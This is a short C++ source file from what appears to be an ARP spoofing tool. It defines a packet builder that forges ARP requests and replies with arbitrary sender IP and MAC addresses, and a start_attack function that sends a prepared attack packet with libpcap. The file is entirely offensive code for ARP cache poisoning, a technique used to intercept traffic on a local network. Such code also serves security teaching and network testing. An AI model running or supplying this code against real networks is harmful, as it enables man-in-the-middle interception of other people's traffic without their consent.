#include "arp_spoof.h"

Arp::Arp(){
    memset(this->target_mac, 0xff, sizeof(this->target_mac));
    this->target_ip = 0;
}

void Arp::make_arp_packet(uint8_t *target_mac, uint8_t *src_mac, int op, uint32_t sender_ip, uint32_t target_ip, ARP_Packet * packet){
    memcpy(packet->eth.dst_MAC,target_mac,sizeof(packet->eth.dst_MAC)); 
    memcpy(packet->eth.src_MAC, src_mac,sizeof(packet->eth.src_MAC));
    packet->eth.ether_type=htons(0x0806);
    packet->arp.hw_type=htons(0x0001);
    packet->arp.p_type=htons(0x0800);
    packet->arp.hw_len=0x06;
    packet->arp.p_len=0x04;
    packet->arp.opcode=htons(op);

    memcpy(packet->arp.sender_mac, src_mac, sizeof(packet->arp.sender_mac));
    if(op==1) { // ARP request, target == broadcast
        memcpy(packet->arp.target_mac, "\x00\x00\x00\x00\x00\x00", sizeof(packet->arp.target_mac));
    }
    if(op==2) { // ARP reply
        memcpy(packet->arp.target_mac, target_mac, sizeof(packet->arp.target_mac));
    }
    packet->arp.sender_ip = sender_ip;
    packet->arp.target_ip = target_ip;

}


void Arp::start_attack(pcap_t* handle, char * data){
    if(pcap_sendpacket(handle, this->attack_pkt, sizeof(ARP_Packet))!=0){
        strcpy(data, "[-] couldn't send attack pkt");
        return;
    }
    strcpy(data, "[+] success to send attack pkt");
}